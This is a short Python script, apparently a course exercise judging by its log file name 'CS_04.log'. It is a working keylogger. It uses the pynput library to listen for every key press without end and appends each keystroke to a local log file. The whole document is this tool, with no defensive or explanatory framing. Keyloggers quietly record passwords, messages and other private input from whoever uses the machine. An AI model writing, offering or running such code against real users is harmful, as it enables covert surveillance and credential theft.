from pynput.keyboard import Key, Listener

# Function to write keystrokes to a file
def on_press(key):
    try:
        with open("CS_04.log", "a") as f:
            f.write('{0} '.format(key))
    except Exception as e:
        print('Error writing to file:', e)

# Create a listener
with Listener(on_press=on_press) as listener:
    listener.join()
